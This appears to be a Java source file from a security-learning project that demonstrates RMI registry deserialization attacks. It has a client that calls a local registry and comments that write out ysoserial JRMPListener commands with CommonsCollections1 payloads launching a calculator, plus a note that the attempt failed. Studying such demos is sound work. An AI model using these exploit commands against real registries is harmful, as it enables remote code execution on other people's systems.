package com.madaha.codesecone.controller.AdvancedAttack.deserialize.rmiDeserialize;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class UserClientEval {
    /**
     * 注册中心攻击客户端与服务端:
     *    (1) 可以用ysoserial生成一个恶意的注册中心，当调用注册中心的方法时，就可以进行恶意利用。
     *       java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 'open /System/Applications/Calculator.app'
     */
    public void fromRegistryEval() throws Exception{
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 12345);
        registry.list();
    }





    public static void main(String[] args) throws Exception{
        UserClientEval eval = new UserClientEval();
        eval.fromRegistryEval();
        // java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections1 'calc'
        // ------没成功，再试一下。。。
        // 啊啊啊啊~~~ 不知道哪里问题。。。。

    }
}
